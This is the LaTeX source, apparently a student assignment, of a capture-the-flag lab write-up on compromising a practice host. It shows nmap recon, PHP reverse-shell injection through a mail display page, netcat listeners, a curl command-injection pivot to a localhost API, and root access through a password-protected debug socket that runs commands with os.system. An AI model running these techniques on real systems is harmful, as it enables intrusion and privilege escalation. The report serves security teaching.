@@ -1,0 +1,288 @@
+\documentclass[titlepage]{article} %{scrartcl}
+\usepackage[english]{babel}
+
+
+\usepackage{amsmath, amssymb}
+
+\usepackage{array}  % for the tables
+
+\usepackage{nameref}  % for referencing with name
+
+\usepackage{hyperref}  % for hyperlinks
+
+\usepackage{mathrsfs}
+
+\usepackage{graphicx}  % for the images
+
+\usepackage{xcolor, colortbl, color}
+
+\usepackage{minted} % code highlighting
+
+\usepackage{gensymb} % for \degree
+
+\usepackage{pgfplots}
+\pgfplotsset{compat=1.18}
+
+\usepackage{tabto}
+
+\usepackage{lipsum} % for the lipsum text
+
+\usepackage{listings}
+
+\usepackage{textcomp} % permille
+
+\usepackage{pdfpages} % for including pdfs
+
+% \usepackage{fancyhdr} % for header/foot
+% \pagestyle{fancy}
+% \fancyhf{}
+% \renewcommand{\headrulewidth}{0pt}
+% \fancyhead[L]{\includegraphics[height=1cm]{img/HSLU\_logo.png}}
+% \fancyhead[R]{\textbf{Computer Science}}
+% \fancyfoot[L]{David Jäggli}
+% \fancyfoot[R]{\thepage}
+% \setlength{\headheight}{33pt}
+
+% \usepackage[backend=biber, style=authoryear-comp]{biblatex}
+% \addbibresource{AArch64_encoder.bib}
+
+% Define custom colors
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\definecolor{lightgray}{gray}{0.95}
+
+% Set minted options globally
+\setminted{
+    bgcolor=lightgray, % Background color
+    frame=none,        % No box around the code
+    linenos=false,     % No line numbers
+  	breaklines
+	frame=lines
+  	% bgcolor=codegray,
+  	% numbersep=5pt,
+	% framesep=2
+}
+
+
+\setminted{
+}
+
+
+
+\newcolumntype{P}[1]{>{\centering\arraybackslash}p{#1}}
+
+\usetikzlibrary{arrows}
+
+\definecolor{Gray}{gray}{0.85}
+
+\setlength{\parindent}{0cm}
+
+% hyperlinks
+\hypersetup{
+    colorlinks,
+    citecolor=black,
+    filecolor=black,
+    linkcolor=black,
+    urlcolor=blue
+}
+
+% for margins
+\usepackage[a4paper,
+            left=2.5cm,right=2.5cm,top=2cm,bottom=2.5cm,%
+            footskip=.3in]{geometry}
+\usepackage[T1]{fontenc}
+
+
+\newcommand{\revshellurl}{\href{https://revshells.com}{revshells.com}}
+
+
+
+\author{Elias Gmünder, Timo Gafner, David Jäggli}
+
+\title{Cyber 2 - CTF3 Report}
+
+
+% ---------- Begin Main Document ----------- %
+
+
+\begin{document}
+
+\maketitle
+\makeatletter
+
+
+\section{CTF3 Report}%
+\label{sec:CTF3 Report}
+
+
+\subsection{Initial information}%
+\label{sub:Initial information}
+
+There was a certain command givin a hint to the next server: (where did we find it?)
+
+\begin{minted}[frame=none]{powershell}
+Get-SCPFolder -ComputerName 'Riften.robstargames.com' -Credential $credential -LocalFolder 'C:\backups\' -RemoteFolder '/var/mail/bugs'
+\end{minted}
+
+The corresponding IP to the domain is: 192.168.22.65
+
+
+\subsection{Recon}
+\label{ssub:recon}
+
+
+Do simple nmap sync-scan:
+
+\begin{minted}{bash}
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 16:02 CET
+Nmap scan report for Riften.robstargames.com (192.168.22.65)
+Host is up (0.00061s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+25/tcp   open   smtp
+80/tcp   open   http
+443/tcp  closed https
+3000/tcp open   ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
+\end{minted}
+
+\subsection{Other info}
+\label{sub:Other info}
+
+Page on port 3000 takes commands, only localhost allowed.
+
+
+\subsection{Mail service}
+\label{sub:Mail service}
+
+On the main page it says that the e-mails sent to bugs@robstargames.com are being displayed here. And since the port 25 is open, an attempt to send an E-Mail was made. 
+The CLI-tool \texttt{sendemail} should do the task.\\
+
+An initial test was made with the following command:
+
+\begin{minted}[frame=none]{bash}
+sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m 'YadaYada' -s 192.168.22.65 -o tls=no
+\end{minted}
+
+Note that the \texttt{-o tls=no} is necessary, otherwise there is a certificate error.\\
+Message "YadaYada" is displayed on frontpage.\\
+
+Next test was if php code gets interpreted, this was made with a simple PHP-String with an echo command in it. And indeed only the echo-string was displayed, not the whole message. \\ 
+
+Get revshell from \revshellurl (PentestMonkey version) with port 9000
+
+\begin{minted}{bash}
+sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m '$(cat revshell.php)' -s 192.168.22.65 -o tls=no
+nc -lvnp 9000
+\end{minted}
+
+Next visit front-page -> easy revshell. \\
+
+Since webshell code is in user space -> must probably have users rights -> exploit webshell to get to user.\\
+Now from within revshell curl request to localhost:3000 with the content being a bash revshell (again generated with \revshellurl \\
+Validated must be 1 (seen in JS-file on command site)\\
+
+
+The commands must be executed in two different terminals:
+
+\begin{minted}{bash}
+nc -lvnp 9001
+curl localhost:3000/api/v1/command -X POST -d "cmd=<jajaja>&validated=1"
+\end{minted}
+
+debupasswort ain't working on anything
+
+linpeas says writable path vuln, but no suitable binary found\\
+SSH-shell is rbash -> sucks\\
+
+
+\newpage
+Further linpeas output analyzed, found /opt/cloak.py \\
+\textit{maybe delete whole file display on shrink on essential lines, i don't know}
+
+\begin{minted}[highlightlines={10-12,32-45}]{python}
+#!/usr/bin/env python3
+
+import socket
+import os
+import hashlib
+
+if os.path.exists("/run/cloak.sock"):
+    os.remove("/run/cloak.sock")
+
+socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+socket.bind("/run/cloak.sock")
+os.system("chmod o+w /run/cloak.sock")
+
+while True:
+    socket.listen(1) 
+    connection, address = socket.accept()
+
+    welcome = "Welcome to the debug socket!\nPlease provide your password: "
+    connection.sendall(welcome.encode())
+
+    data = connection.recv(1024)
+
+    # for security reasons I have secured access to the debug socket with password
+    hash = "e0dc3deda28c0a78ddb6ed718f9d6332378df1b1ec4654fa2177fbcf773fd9c1"
+
+    if(hashlib.sha256(data.decode().strip().encode()).hexdigest() == hash):
+        print("success")
+        response = "password accepted!\n"
+        connection.sendall(response.encode())
+
+        try:
+            while True:
+                response = "enter command: "
+                connection.sendall(response.encode())
+                data = connection.recv(1024)
+
+                if data:
+                    returncode = os.system(data)
+                    if(returncode == 0):
+                        response = "command executed!\n"
+                        connection.sendall(response.encode())
+                    else:
+                        response = "an error has occured..\n"
+                        connection.sendall(response.encode())
+                        connection.close()
+        # sometimes this crashes but I have set up a service that should restart it
+        except:
+            print("nothing to see here..")
+
+    # just in case..
+    else:
+        print("invalid password")
+        response = "invalid password, goodbye!\n"
+        connection.sendall(response.encode())
+        connection.close()
+\end{minted}
+
+\newpage
+it says debug socket, hint to use debugpassword.txt -> it works. \\ 
+socket and file is owned by root -> execute commands as root. \\
+
+Read root flag:
+
+\begin{minted}{bash}
+cat /root/root.txt > /home/stormcloak/out
+command executed!
+enter command: asdf
+asdf
+an error has occured..
+stormcloak@Riften:~$ cat out
+cat out
+Your flag is: 8e9e8455f6840e45e8c12798e7a47bf2 
+\end{minted}
+
+Get owned bitch.
+
+
+
+
+\end{document}
